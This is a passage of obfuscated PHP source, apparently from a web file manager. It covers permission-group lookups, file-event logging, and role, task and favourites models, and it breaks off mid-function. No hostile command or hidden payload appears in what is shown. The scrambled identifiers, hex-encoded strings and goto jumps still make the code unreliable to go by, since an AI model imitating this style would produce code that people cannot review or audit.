$this->groupContainUser($¥»¹«‡é, $¶½½íğã)) { $´ÍÙíÁá = !0; $ÅÕ“ùÅ = $this->groupStepToUserGroup($¥»¹«‡é, $¶½½íğã); if ($ÅÕ“ùÅ < $‚õ÷ÏøŸ) { $‚õ÷ÏøŸ = $ÅÕ“ùÅ; $£‡’Áşó = $ä³â¬—»; $ı‰§˜Ö¢ = $‚ÈÊı€Í; $›´œ§±‹ = $¥»¹«‡é; } if ($ÅÕ“ùÅ == $‚õ÷ÏøŸ && $ä³â¬—» >= $£‡’Áşó) { $£‡’Áşó = $ä³â¬—»; $ı‰§˜Ö¢ = $‚ÈÊı€Í; $›´œ§±‹ = $¥»¹«‡é; } } else { if ($¥»¹«‡é == $›ôîÄÊ‹[190]) { $¬ØôË” = !0; $ƒ¢ÆÌò = $‚ÈÊı€Í; $š˜çÍ‹Ä = $ä³â¬—»; } } } } if ($Í…ÎË¯ê) { $’Û×ˆ†î = $Á‰«Ìò¢; $‚ÈÊı€Í = $á§¯¢°¤; $û¡ÜáÂ­ = LNG($›ôîÄÊ‹[2003]); } else { if ($´ÍÙíÁá) { $’Û×ˆ†î = $£‡’Áşó; $‚ÈÊı€Í = $ı‰§˜Ö¢; $Œ›Ğ„‘Í = Model($›ôîÄÊ‹[513])->getInfo($›´œ§±‹); $û¡ÜáÂ­ = $›ôîÄÊ‹[159] . $Œ›Ğ„‘Í[$›ôîÄÊ‹[517]] . $›ôîÄÊ‹[2004] . LNG($›ôîÄÊ‹[2005]); } else { if ($¬ØôË”) { $’Û×ˆ†î = $š˜çÍ‹Ä; $‚ÈÊı€Í = $ƒ¢ÆÌò; $û¡ÜáÂ­ = LNG($›ôîÄÊ‹[1976]); } else { $’Û×ˆ†î = 0; $‚ÈÊı€Í = !1; $û¡ÜáÂ­ = $›ôîÄÊ‹[12]; } } } $®ÄÒºæ÷ = array($›ôîÄÊ‹[1995] => intval($’Û×ˆ†î), $›ôîÄÊ‹[1979] => $‚ÈÊı€Í, $›ôîÄÊ‹[1996] => $û¡ÜáÂ­, $›ôîÄÊ‹[1988] => $¡¶ëúİÒ[$›ôîÄÊ‹[394]]); return $®ÄÒºæ÷; } private function groupContainUser($©ƒ¦Ÿ¨ò, $Ÿìı×Ä = false) { return in_array($©ƒ¦Ÿ¨ò, $this->userGroupParents($Ÿìı×Ä)); } private function groupStepToUserGroup($ñöÖ“ˆô, $Æù…ı¢Ü = false) { $«ØÄƒ =& $_SERVER[ì…™Î¶Ï]; $Ä­Ô€ŠÉ = $this->userGroupList($Æù…ı¢Ü); $³ÍğğºŞ = 1000; $…‰ÆÙ¦ù = $GLOBALS[$«ØÄƒ[6]][$«ØÄƒ[90]][$«ØÄƒ[1899]] == 1; $§…å²ç¢ = $…‰ÆÙ¦ù ? 3 : 2; foreach ($Ä­Ô€ŠÉ as $¶şåı…‹) { if ($¶şåı…‹[$«ØÄƒ[1799]] == $ñöÖ“ˆô) { return 0; } $¥éØá¬š = explode($«ØÄƒ[50], trim($¶şåı…‹[$«ØÄƒ[512]], $«ØÄƒ[50])); if ($¥éØá¬š[0] == $«ØÄƒ[190] && count($¥éØá¬š) > $§…å²ç¢) { $Ş‚¯¦®¼ = array_reverse(array_slice($¥éØá¬š, $§…å²ç¢)); $¸¾ÃÕÀ³ = array_search($ñöÖ“ˆô, $Ş‚¯¦®¼); if ($¸¾ÃÕÀ³ !== !1 && $¸¾ÃÕÀ³ + 1 <= $³ÍğğºŞ) { $³ÍğğºŞ = $¸¾ÃÕÀ³ + 1; } } } return $³ÍğğºŞ; } private function userGroupList($àã„€×Ä = false) { $¸‰Âß¹‰ =& $_SERVER[ì…™Î¶Ï]; static $™Úˆ¢¾ß = array(); if (isset($™Úˆ¢¾ß[$àã„€×Ä])) { return $™Úˆ¢¾ß[$àã„€×Ä]; } $ÜÖ„»šÊ = Model($¸‰Âß¹‰[529])->getInfo($àã„€×Ä); $™Úˆ¢¾ß[$àã„€×Ä] = array_to_keyvalue($ÜÖ„»šÊ[$¸‰Âß¹‰[1977]], $¸‰Âß¹‰[1799]); return $™Úˆ¢¾ß[$àã„€×Ä]; } public function userGroupParents($·»ĞâÒ³) { $àïÓˆĞ« =& $_SERVER[ì…™Î¶Ï]; static $°¡ôçµå = array(); $·»ĞâÒ³ = $·»ĞâÒ³ ? $·»ĞâÒ³ : USER_ID; if (isset($°¡ôçµå[$·»ĞâÒ³])) { return $°¡ôçµå[$·»ĞâÒ³]; } $½½¸óŸ‹ = $this->userGroupList($·»ĞâÒ³); $ê˜ñÓ„ì = array(); $ Íîø÷ë = $GLOBALS[$àïÓˆĞ«[6]][$àïÓˆĞ«[90]][$àïÓˆĞ«[1899]] == 1; $¦Ì¯ı— = $ Íîø÷ë ? 3 : 2; foreach ($½½¸óŸ‹ as $è¹§“—ì) { $†ÀÅ†ó– = array($è¹§“—ì[$àïÓˆĞ«[1799]]); $ŒŞÕÂí† = explode($àïÓˆĞ«[50], trim($è¹§“—ì[$àïÓˆĞ«[512]], $àïÓˆĞ«[50])); if ($ŒŞÕÂí†[0] == $àïÓˆĞ«[190] && count($ŒŞÕÂí†) > $¦Ì¯ı—) { $îÛÛ³úÅ = array_slice($ŒŞÕÂí†, $¦Ì¯ı—); $†ÀÅ†ó– = array_merge($†ÀÅ†ó–, array_reverse($îÛÛ³úÅ)); } $ê˜ñÓ„ì = array_merge($ê˜ñÓ„ì, $†ÀÅ†ó–); } $°¡ôçµå[$·»ĞâÒ³] = array_unique($ê˜ñÓ„ì); return $°¡ôçµå[$·»ĞâÒ³]; } public function authTargetInfoMake($ü‘³„Ü) { $­Ç÷…³” =& $_SERVER[ì…™Î¶Ï]; $‡¥½¥¤ç = array(); $²Ö´ÊË÷ = array(); foreach ($ü‘³„Ü as $™Î¬Óß©) { if ($™Î¬Óß©[$­Ç÷…³”[403]] == SourceModel::TYPE_USER) { $‡¥½¥¤ç[] = intval($™Î¬Óß©[$­Ç÷…³”[495]]); } else { if ($™Î¬Óß©[$­Ç÷…³”[403]] == SourceModel::TYPE_GROUP) { $²Ö´ÊË÷[] = intval($™Î¬Óß©[$­Ç÷…³”[495]]); } } } if ($‡¥½¥¤ç) { $‡¥½¥¤ç = Model($­Ç÷…³”[504])->userListInfo($‡¥½¥¤ç); } if ($²Ö´ÊË÷) { $è“×Ô¢ = array($­Ç÷…³”[1886] => array($­Ç÷…³”[410], $²Ö´ÊË÷)); $²Ö´ÊË÷ = Model($­Ç÷…³”[513])->field($­Ç÷…³”[2006])->where($è“×Ô¢)->select(); $²Ö´ÊË÷ = array_to_keyvalue($²Ö´ÊË÷, $­Ç÷…³”[1799]); } return array($­Ç÷…³”[2007] => $‡¥½¥¤ç, $­Ç÷…³”[2008] => $²Ö´ÊË÷); } public function authInfo($¼™¢¿Ğ“) { $­İùı©Õ =& $_SERVER[ì…™Î¶Ï]; if ($¼™¢¿Ğ“[$­İùı©Õ[1900]]) { $Û÷º´İ = Model($­İùı©Õ[498])->listData($¼™¢¿Ğ“[$­İùı©Õ[1900]]); if (!$Û÷º´İ) { return !1; $”­Œ„ŞÅ = Model($­İùı©Õ[498])->listData(); $ÀÜ•Í÷¡ = array_filter_by_field($”­Œ„ŞÅ, $­İùı©Õ[405], $­İùı©Õ[190]); return $ÀÜ•Í÷¡; } $İ÷Ä¹ÎÀ = array_field_key($Û÷º´İ, array($­İùı©Õ[392], $­İùı©Õ[32], $­İùı©Õ[405], $­İùı©Õ[1821], $­İùı©Õ[1822])); $İ÷Ä¹ÎÀ[$­İùı©Õ[2009]] = $¼™¢¿Ğ“; return $İ÷Ä¹ÎÀ; } else { return array($­İùı©Õ[411] => 0, $­İùı©Õ[1805] => $¼™¢¿Ğ“[$­İùı©Õ[1954]], $­İùı©Õ[412] => $­İùı©Õ[12], $­İùı©Õ[1821] => $­İùı©Õ[2010]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\x72\143\145\x5f\145\166\145\156\x74"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\x54\151\155\x65", "\164\151\155\x65", "\151\156\163\x65\162\164", "\x66\165\156\143\x74\x69\157\156"), array("\x64\x65\x73\x63", '', "\x69\x6e\163\x65\162\164\54\x75\x70\x64\x61\x74\x65\54\x73\x65\x6c\x65\x63\164", "\x6a\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ì—Ğ×ûà, $¦¥†é©î, $›µå¾¼ = '') { $ÌÂŒ Ñë =& $_SERVER[ì…™Î¶Ï]; if (!$this->eventSave) { return; } $ÁÂ‘¹›£ = Model($ÌÂŒ Ñë[1301])->sourceInfo($ì—Ğ×ûà); if (!$ÁÂ‘¹›£) { return !1; } if ($this->isCacheEvent($ÁÂ‘¹›£, $¦¥†é©î)) { return; } if ($›µå¾¼ && is_string($›µå¾¼)) { $›µå¾¼ = array($ÌÂŒ Ñë[1837] => $›µå¾¼); } $ŒÅÚüÑ = array($ÌÂŒ Ñë[409] => $ì—Ğ×ûà, $ÌÂŒ Ñë[2011] => $ÁÂ‘¹›£[$ÌÂŒ Ñë[489]], $ÌÂŒ Ñë[2012] => $ÁÂ‘¹›£[$ÌÂŒ Ñë[32]], $ÌÂŒ Ñë[510] => !empty($ÁÂ‘¹›£[$ÌÂŒ Ñë[510]]) ? $ÁÂ‘¹›£[$ÌÂŒ Ñë[510]] : $ÌÂŒ Ñë[12], $ÌÂŒ Ñë[1622] => USER_ID, $ÌÂŒ Ñë[414] => $¦¥†é©î, $ÌÂŒ Ñë[1624] => $›µå¾¼); $this->addSystemLog($¦¥†é©î, $ŒÅÚüÑ); unset($ŒÅÚüÑ[$ÌÂŒ Ñë[2012]], $ŒÅÚüÑ[$ÌÂŒ Ñë[510]]); return $this->add($ŒÅÚüÑ); } private function addSystemLog($œö†ˆ¹ı, $Àü“„€Ú) { $€Ÿ¤™Ñ§ =& $_SERVER[ì…™Î¶Ï]; if ($œö†ˆ¹ı == $€Ÿ¤™Ñ§[2013]) { $œö†ˆ¹ı = $Àü“„€Ú[$€Ÿ¤™Ñ§[442]][$€Ÿ¤™Ñ§[2014]]; } else { if (in_array($œö†ˆ¹ı, array($€Ÿ¤™Ñ§[1779], $€Ÿ¤™Ñ§[2015]))) { $œö†ˆ¹ı = $Àü“„€Ú[$€Ÿ¤™Ñ§[442]][$€Ÿ¤™Ñ§[730]]; } } $»«İÀ–Ó = array_merge($Àü“„€Ú, array($€Ÿ¤™Ñ§[2016] => $Àü“„€Ú[$€Ÿ¤™Ñ§[394]], $€Ÿ¤™Ñ§[2017] => $Àü“„€Ú[$€Ÿ¤™Ñ§[2017]])); Hook::trigger($€Ÿ¤™Ñ§[2018], $€Ÿ¤™Ñ§[2019] . $œö†ˆ¹ı, $Àü“„€Ú); Model($€Ÿ¤™Ñ§[1743])->addLog($€Ÿ¤™Ñ§[2019] . $œö†ˆ¹ı, $»«İÀ–Ó); } private function isCacheEvent($ƒÄº–Æ, $‰ÉµÑØŸ) { if ($ƒÄº–Æ[$_SERVER[ì…™Î¶Ï][403]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($êÙá•å‰, $Ù”§öäŞ) { $°Œœ¨‚Ñ =& $_SERVER[ì…™Î¶Ï]; $æãÌ¶ § = Model($°Œœ¨‚Ñ[1301])->sourceInfo($êÙá•å‰); $ı‰Ú¿Î = array($°Œœ¨‚Ñ[2014] => $Ù”§öäŞ, $°Œœ¨‚Ñ[32] => $æãÌ¶ §[$°Œœ¨‚Ñ[32]]); return $this->addEvent($êÙá•å‰, $°Œœ¨‚Ñ[2013], $ı‰Ú¿Î); } public function eventFileEdit($‹¥¼©Ò) { $Îéúø =& $_SERVER[ì…™Î¶Ï]; $íÕ¤ÕÜË = array($Îéúø[2020] => $_SERVER[$Îéúø[2021]], $Îéúø[2022] => strtolower(ACTION)); return $this->addEvent($‹¥¼©Ò, $Îéúø[1769], $íÕ¤ÕÜË); } public function eventRecycle($Ã›Œ¥â–, $˜É´„ğ²) { return $this->addEvent($Ã›Œ¥â–, $_SERVER[ì…™Î¶Ï][2015], $˜É´„ğ²); } public function eventRemove($ÏØ¬şşü) { $Õúì·ë§ =& $_SERVER[ì…™Î¶Ï]; $”µš–üæ = Model($Õúì·ë§[1301])->sourceInfo($ÏØ¬şşü); $¤€äµúÄ = $”µš–üæ[$Õúì·ë§[32]]; return $this->addEvent($”µš–üæ[$Õúì·ë§[489]], $Õúì·ë§[1768], $¤€äµúÄ); } public function eventShare($ìîÛŠğ¥, $Èª¯Š´‘) { return $this->addEvent($ìîÛŠğ¥, $_SERVER[ì…™Î¶Ï][1779], $Èª¯Š´‘); } public function eventMove($ÛÆµÉµØ, $²Ê‰Ë‹³, $¢âöõ¬) { $ÔüàˆÌ =& $_SERVER[ì…™Î¶Ï]; $‰÷şÄ›ü = Model($ÔüàˆÌ[1301]); $Ûª±ùö¯ = $‰÷şÄ›ü->sourceInfo($ÛÆµÉµØ); $ØÄø¥Îä = $‰÷şÄ›ü->sourceInfo($²Ê‰Ë‹³); $£øÂ¬¯å = $‰÷şÄ›ü->sourceInfo($¢âöõ¬); $ìõı£¹¸ = array($ÔüàˆÌ[1134] => $²Ê‰Ë‹³, $ÔüàˆÌ[2023] => $ØÄø¥Îä[$ÔüàˆÌ[32]], $ÔüàˆÌ[2002] => !empty($ØÄø¥Îä[$ÔüàˆÌ[510]]) ? $ØÄø¥Îä[$ÔüàˆÌ[510]] : $ÔüàˆÌ[12], $ÔüàˆÌ[1135] => $¢âöõ¬, $ÔüàˆÌ[2024] => $£øÂ¬¯å[$ÔüàˆÌ[32]], $ÔüàˆÌ[2025] => !empty($£øÂ¬¯å[$ÔüàˆÌ[510]]) ? $£øÂ¬¯å[$ÔüàˆÌ[510]] : $ÔüàˆÌ[12]); $this->addEvent($ÛÆµÉµØ, $ÔüàˆÌ[542], $ìõı£¹¸); $Ûª±ùö¯ = $‰÷şÄ›ü->sourceInfo($ÛÆµÉµØ); $ìõı£¹¸ = array($ÔüàˆÌ[394] => $Ûª±ùö¯[$ÔüàˆÌ[394]], $ÔüàˆÌ[32] => $Ûª±ùö¯[$ÔüàˆÌ[32]]); $this->addEvent($²Ê‰Ë‹³, $ÔüàˆÌ[2026], $ìõı£¹¸); } public function eventCopy($âÊŞñ…¬) { $this->eventCreate($âÊŞñ…¬, $_SERVER[ì…™Î¶Ï][540]); } public function eventRename($Ô…†éß, $Ñ¾’Ûê®, $äÜ¨‘–Ó) { $ĞóÜ¶Öæ =& $_SERVER[ì…™Î¶Ï]; $²…°êæ‚ = array($ĞóÜ¶Öæ[1134] => $Ñ¾’Ûê®, $ĞóÜ¶Öæ[1135] => $äÜ¨‘–Ó); return $this->addEvent($Ô…†éß, $ĞóÜ¶Öæ[1316], $²…°êæ‚); } public function eventAddComment($ç°îŠ·, $“ÎÎ©ú) { return $this->addEvent($ç°îŠ·, $_SERVER[ì…™Î¶Ï][2027], $“ÎÎ©ú); } public function eventAddDesc($ìšœ¬Ìö, $½•íéö‡) { return $this->addEvent($ìšœ¬Ìö, $_SERVER[ì…™Î¶Ï][2028], $½•íéö‡); } public function listBySource($èƒ¶£‡Ï) { $²¾¹âîç =& $_SERVER[ì…™Î¶Ï]; $Ğ†æÆê« = Model($²¾¹âîç[1301])->sourceInfo($èƒ¶£‡Ï); $ŠÙßŠ¸ = array($²¾¹âîç[409] => $èƒ¶£‡Ï); if ($Ğ†æÆê«[$²¾¹âîç[402]] == $²¾¹âîç[89]) { $´åìŞ¿® = Model($²¾¹âîç[1301])->listSearchChildren($èƒ¶£‡Ï, 20000); $´åìŞ¿®[] = $èƒ¶£‡Ï . $²¾¹âîç[373]; $ŠÙßŠ¸ = array($²¾¹âîç[394] => array($²¾¹âîç[7], $´åìŞ¿®)); } $ÚŸİş—« = $this->where($ŠÙßŠ¸)->order($²¾¹âîç[2029])->selectPage(); if ($ÚŸİş—«[$²¾¹âîç[361]][$²¾¹âîç[362]] == 0) { $ÚŸİş—«[$²¾¹âîç[361]][$²¾¹âîç[362]] = 1; $ÚŸİş—«[$²¾¹âîç[364]] = array(array($²¾¹âîç[409] => $èƒ¶£‡Ï, $²¾¹âîç[2011] => $Ğ†æÆê«[$²¾¹âîç[489]], $²¾¹âîç[1622] => $Ğ†æÆê«[$²¾¹âîç[443]], $²¾¹âîç[414] => $²¾¹âîç[2030], $²¾¹âîç[415] => $Ğ†æÆê«[$²¾¹âîç[193]], $²¾¹âîç[1624] => $²¾¹âîç[12])); } return $this->eventListParse($ÚŸİş—«, $èƒ¶£‡Ï); } private function eventListParse($â‹²©´¾, $Ç—ì¿‹˜) { $È’è¿Ê¬ =& $_SERVER[ì…™Î¶Ï]; $Ö‘Ã³øÂ = $â‹²©´¾[$È’è¿Ê¬[364]]; $†ôĞ³“³ = array_to_keyvalue($Ö‘Ã³øÂ, $È’è¿Ê¬[12], $È’è¿Ê¬[394]); $ªô”üû§ = array_to_keyvalue($Ö‘Ã³øÂ, $È’è¿Ê¬[12], $È’è¿Ê¬[2017]); foreach ($Ö‘Ã³øÂ as $ÁÔ“¨Ò) { $ÃıÆŠõŒ = $ÁÔ“¨Ò[$È’è¿Ê¬[442]]; if ($ÁÔ“¨Ò[$È’è¿Ê¬[33]] == $È’è¿Ê¬[542] && isset($ÃıÆŠõŒ[$È’è¿Ê¬[1134]])) { $†ôĞ³“³[] = $ÃıÆŠõŒ[$È’è¿Ê¬[1134]] . $È’è¿Ê¬[12]; $†ôĞ³“³[] = $ÃıÆŠõŒ[$È’è¿Ê¬[1135]] . $È’è¿Ê¬[12]; } if ($ÁÔ“¨Ò[$È’è¿Ê¬[33]] == $È’è¿Ê¬[2026] && isset($ÃıÆŠõŒ[$È’è¿Ê¬[394]])) { $†ôĞ³“³[] = $ÃıÆŠõŒ[$È’è¿Ê¬[394]] . $È’è¿Ê¬[12]; } } $†ôĞ³“³ = array_merge($†ôĞ³“³, $ªô”üû§, array($Ç—ì¿‹˜ . $È’è¿Ê¬[12])); $†ôĞ³“³ = array_unique($†ôĞ³“³); $³²½õ¸¢ = array_unique(array_to_keyvalue($Ö‘Ã³øÂ, $È’è¿Ê¬[12], $È’è¿Ê¬[1631])); $ñËÓ×®š = Model($È’è¿Ê¬[529])->userListInfo($³²½õ¸¢); $éËâŞ’© = Model($È’è¿Ê¬[800])->sourceListInfo($†ôĞ³“³, !0); foreach ($Ö‘Ã³øÂ as &$ÁÔ“¨Ò) { if ($ÁÔ“¨Ò[$È’è¿Ê¬[33]] == $È’è¿Ê¬[542] && isset($ÁÔ“¨Ò[$È’è¿Ê¬[442]][$È’è¿Ê¬[1134]])) { $ÁÔ“¨Ò[$È’è¿Ê¬[442]][$È’è¿Ê¬[1134]] = $éËâŞ’©[$ÁÔ“¨Ò[$È’è¿Ê¬[442]][$È’è¿Ê¬[1134]]]; $ÁÔ“¨Ò[$È’è¿Ê¬[442]][$È’è¿Ê¬[1135]] = $éËâŞ’©[$ÁÔ“¨Ò[$È’è¿Ê¬[442]][$È’è¿Ê¬[1135]]]; } if ($ÁÔ“¨Ò[$È’è¿Ê¬[33]] == $È’è¿Ê¬[2026] && isset($ÁÔ“¨Ò[$È’è¿Ê¬[442]][$È’è¿Ê¬[394]])) { $ÁÔ“¨Ò[$È’è¿Ê¬[442]][$È’è¿Ê¬[394]] = $éËâŞ’©[$ÁÔ“¨Ò[$È’è¿Ê¬[442]][$È’è¿Ê¬[394]]]; } $ÁÔ“¨Ò[$È’è¿Ê¬[87]] = $éËâŞ’©[$ÁÔ“¨Ò[$È’è¿Ê¬[394]]]; $ÁÔ“¨Ò[$È’è¿Ê¬[2031]] = $éËâŞ’©[$ÁÔ“¨Ò[$È’è¿Ê¬[2017]]]; if ($ÁÔ“¨Ò[$È’è¿Ê¬[33]] == $È’è¿Ê¬[1768]) { $ÁÔ“¨Ò[$È’è¿Ê¬[2031]] = $ÁÔ“¨Ò[$È’è¿Ê¬[87]]; $ÁÔ“¨Ò[$È’è¿Ê¬[2017]] = $ÁÔ“¨Ò[$È’è¿Ê¬[2031]][$È’è¿Ê¬[394]]; $ÁÔ“¨Ò[$È’è¿Ê¬[87]] = !1; $ÁÔ“¨Ò[$È’è¿Ê¬[394]] = $È’è¿Ê¬[12]; } $ÁÔ“¨Ò[$È’è¿Ê¬[1962]] = $ñËÓ×®š[$ÁÔ“¨Ò[$È’è¿Ê¬[1631]]]; } unset($ÁÔ“¨Ò); $â‹²©´¾[$È’è¿Ê¬[364]] = $Ö‘Ã³øÂ; return $â‹²©´¾; } public function removeBySource($Ş¬´õò) { $ã‚“ƒ¦İ = array($_SERVER[ì…™Î¶Ï][409] => $Ş¬´õò); $this->where($ã‚“ƒ¦İ)->remove(); } } goto Eá¼íÄ¦Ÿƒ; Aª”›‚Ô×: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\162\x6f\x6c\145\x4c\151\x73\164"; public $field = array("\156\141\x6d\x65", "\141\x75\164\150", "\154\141\142\x65\x6c", "\x64\x69\163\160\154\141\x79", "\163\171\163\x74\145\x6d", "\x64\x65\163\143", "\151\x67\156\157\162\x65\x45\170\164", "\x69\x67\156\x6f\x72\x65\x46\151\x6c\145\123\x69\172\x65", "\x61\144\155\x69\x6e\x69\163\164\162\x61\x74\x6f\162", "\x73\157\x72\x74"); public function listData($àõ™Úš = false, $¹ş‰ğº± = "\163\157\x72\x74", $ã»˜Ëæ• = false) { $—Øê¹©æ =& $_SERVER[ì…™Î¶Ï]; $¹²™È¾Ü = parent::listData($àõ™Úš, $¹ş‰ğº±, $ã»˜Ëæ•); if (!$àõ™Úš) { foreach ($¹²™È¾Ü as $íäµ¯‹÷ => $¢°±Ãòî) { if ($¢°±Ãòî[$—Øê¹©æ[1992]] == 1) { $¹²™È¾Ü[$íäµ¯‹÷][$—Øê¹©æ[442]] = LNG($—Øê¹©æ[2219]); } } } return $¹²™È¾Ü; } public function update($¬õÃ¨Âø, $™ÌœÜ€Å) { $Ô¹¶ü©È =& $_SERVER[ì…™Î¶Ï]; $ß°şå = parent::listData($¬õÃ¨Âø); $§äÜá©é = $this->findByName($™ÌœÜ€Å[$Ô¹¶ü©È[32]]); if (!$ß°şå || $§äÜá©é && $§äÜá©é[$Ô¹¶ü©È[392]] != $ß°şå[$Ô¹¶ü©È[392]]) { return !1; } if ($§äÜá©é[$Ô¹¶ü©È[1992]] == 1) { $™ÌœÜ€Å = array($Ô¹¶ü©È[32] => $™ÌœÜ€Å[$Ô¹¶ü©È[32]], $Ô¹¶ü©È[1821] => $™ÌœÜ€Å[$Ô¹¶ü©È[1821]]); } $this->filterAuth($™ÌœÜ€Å[$Ô¹¶ü©È[405]]); return parent::update($¬õÃ¨Âø, $™ÌœÜ€Å); } public function remove($ÊÔ¿ë¥¤) { $²‡åÌ  = parent::listData($ÊÔ¿ë¥¤); if (!$²‡åÌ  || $²‡åÌ [$_SERVER[ì…™Î¶Ï][1250]]) { return !1; } return parent::remove($ÊÔ¿ë¥¤); } public function add($•–Õ²½®) { $İ¢‚»®¹ =& $_SERVER[ì…™Î¶Ï]; $§ŒÓÙ©– = $•–Õ²½®[$İ¢‚»®¹[32]]; if ($this->findByName($§ŒÓÙ©–)) { return !1; } $€È…‡‰± = array($İ¢‚»®¹[412] => $§ŒÓÙ©–, $İ¢‚»®¹[1805] => $İ¢‚»®¹[12], $İ¢‚»®¹[1801] => $İ¢‚»®¹[1809], $İ¢‚»®¹[2220] => 1, $İ¢‚»®¹[1804] => 0, $İ¢‚»®¹[2221] => 0, $İ¢‚»®¹[1803] => $this->getSort()); $•–Õ²½® = array_merge($€È…‡‰±, $•–Õ²½®); $this->filterAuth($•–Õ²½®[$İ¢‚»®¹[405]]); return parent::insert($•–Õ²½®); } private function getSort() { $È™‘…×å =& $_SERVER[ì…™Î¶Ï]; $‹ıÒ£µÙ = parent::listData(); $ÑÎñû©² = array_to_keyvalue($‹ıÒ£µÙ, $È™‘…×å[12], $È™‘…×å[1822]); return empty($ÑÎñû©²) ? 0 : max($ÑÎñû©²) + 1; } private function filterAuth(&$ëß‚¥Ú) { $˜Ù­„é÷ =& $_SERVER[ì…™Î¶Ï]; $œˆÁí§ş = array(); $«öš¹Ï = array_filter(explode($˜Ù­„é÷[50], $ëß‚¥Ú)); foreach ($«öš¹Ï as $ëß‚¥Ú) { $íÜÕ×  = explode($˜Ù­„é÷[10], $ëß‚¥Ú); if ($íÜÕ× [0] == $˜Ù­„é÷[2222] && $íÜÕ× [1] != $˜Ù­„é÷[1169]) { $Ğ³á¹Á = $íÜÕ× [0] . $˜Ù­„é÷[10] . $íÜÕ× [1] . $˜Ù­„é÷[2223]; if (!in_array($Ğ³á¹Á, $«öš¹Ï)) { $œˆÁí§ş[] = $Ğ³á¹Á; } } $œˆÁí§ş[] = $ëß‚¥Ú; } $ëß‚¥Ú = implode($˜Ù­„é÷[50], $œˆÁí§ş); } public function sort($™ŸÆ™¿˜, $şŠıÓŠ„) { return parent::update($™ŸÆ™¿˜, $şŠıÓŠ„); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\56\164\141\163\x6b\114\x69\163\164"; public $field = array("\x6e\141\155\x65", "\x74\171\x70\x65", "\x65\x76\145\x6e\164", "\164\x69\x6d\x65", "\x64\x65\163\x63", "\x73\x79\163\164\145\x6d", "\145\x6e\x61\x62\x6c\145", "\154\x61\x73\164\x52\x75\156", "\x73\157\x72\x74"); public function listData($™ıï¹’– = false, $ìÀè = "\x73\157\162\x74", $¨û€„ = false) { return parent::listData($™ıï¹’–, $ìÀè, $¨û€„); } public function add($‘ğõû‰) { $ÊÏÔ»ø =& $_SERVER[ì…™Î¶Ï]; $íáïÉ²× = $this->findByName($‘ğõû‰[$ÊÏÔ»ø[32]]); if ($íáïÉ²×) { return !1; } $‘ğõû‰[$ÊÏÔ»ø[1592]] = 0; $‘ğõû‰[$ÊÏÔ»ø[1822]] = $this->getSort(); return parent::insert($‘ğõû‰); } private function getSort() { $³ª—ˆéç =& $_SERVER[ì…™Î¶Ï]; $ßÆìû© = parent::listData(); $î„ô¼Ö‰ = array_to_keyvalue($ßÆìû©, $³ª—ˆéç[12], $³ª—ˆéç[1822]); return empty($î„ô¼Ö‰) ? 0 : max($î„ô¼Ö‰) + 1; } public function update($Ğ÷Èàà, $–éõÖÊ) { $öéÛÄ‚‰ =& $_SERVER[ì…™Î¶Ï]; $ªÍÖå­ë = $this->listData($Ğ÷Èàà); $Ù¾½œ‘à = $this->findByName($–éõÖÊ[$öéÛÄ‚‰[32]]); if (!$ªÍÖå­ë || $Ù¾½œ‘à && $Ù¾½œ‘à[$öéÛÄ‚‰[392]] != $ªÍÖå­ë[$öéÛÄ‚‰[392]]) { return !1; } return parent::update($Ğ÷Èàà, $–éõÖÊ); } public function remove($¾”’È, $Ê¼½ä¾˜ = false) { $Ğ˜•¨€ =& $_SERVER[ì…™Î¶Ï]; $ã™ç¡“« = $this->listData($¾”’È); if (!$ã™ç¡“«) { return; } if (!$Ê¼½ä¾˜ && $ã™ç¡“«[$Ğ˜•¨€[1250]] == $Ğ˜•¨€[89]) { return !1; } return parent::remove($¾”’È); } public function enable($Ä—ÜõÚï, $„ éºîø) { return $this->update($Ä—ÜõÚï, array($_SERVER[ì…™Î¶Ï][2214] => $„ éºîø)); } public function run($’¸¥Íğ¥) { return $this->update($’¸¥Íğ¥, array($_SERVER[ì…™Î¶Ï][2224] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($µ›ğà»²) { $½ÕÑå¸± =& $_SERVER[ì…™Î¶Ï]; return array($½ÕÑå¸±[1907] => array(USER_ID, $½ÕÑå¸±[2225])); } protected function listData() { $¡ÀÛˆ‹¾ =& $_SERVER[ì…™Î¶Ï]; $¦òù¿—š = array($¡ÀÛˆ‹¾[1622] => USER_ID, $¡ÀÛˆ‹¾[474] => 0); $ÕÑÚ÷³³ = $¡ÀÛˆ‹¾[2226]; $İÚåŒ = $this->field($ÕÑÚ÷³³)->where($¦òù¿—š)->order($¡ÀÛˆ‹¾[2227])->select(); return $İÚåŒ ? $İÚåŒ : array(); } protected function resetCache() { } protected function listView() { $»ı¯‘Ñ =& $_SERVER[ì…™Î¶Ï]; $‚Õ€œƒ = $this->listData(); $†ÒÛ¹Ûª = array_filter_by_field($‚Õ€œƒ, $»ı¯‘Ñ[33], $»ı¯‘Ñ[408]); $âÂƒô™Ñ = array_to_keyvalue($†ÒÛ¹Ûª, $»ı¯‘Ñ[12], $»ı¯‘Ñ[78]); if (!$âÂƒô™Ñ) { return $‚Õ€œƒ; } $ûåÌĞĞå = 2000; $Î¯„¤ğé = array($»ı¯‘Ñ[409] => array($»ı¯‘Ñ[410], $âÂƒô™Ñ)); $ßñşÇĞ™ = Model($»ı¯‘Ñ[800])->listSource($Î¯„¤ğé, $ûåÌĞĞå); $ßñşÇĞ™ = array_merge($ßñşÇĞ™[$»ı¯‘Ñ[76]], $ßñşÇĞ™[$»ı¯‘Ñ[77]]); $ßñşÇĞ™ = array_to_keyvalue($ßñşÇĞ™, $»ı¯‘Ñ[394]); foreach ($‚Õ€œƒ as $á‰Šïö¤ => $ÌåÕĞ) { $¢ÆúØ£ı = $ßñşÇĞ™[$ÌåÕĞ[$»ı¯‘Ñ[78]]]; $¢ÆúØ£ı = $¢ÆúØ£ı ? $¢ÆúØ£ı : array(); $‚Õ€œƒ[$á‰Šïö¤] = array_merge($¢ÆúØ£ı, $ÌåÕĞ); } return $‚Õ€œƒ; } protected function addFav($†Õˆîßı, $…¯³Ò = '', $ü²ÏÆ×¬ = 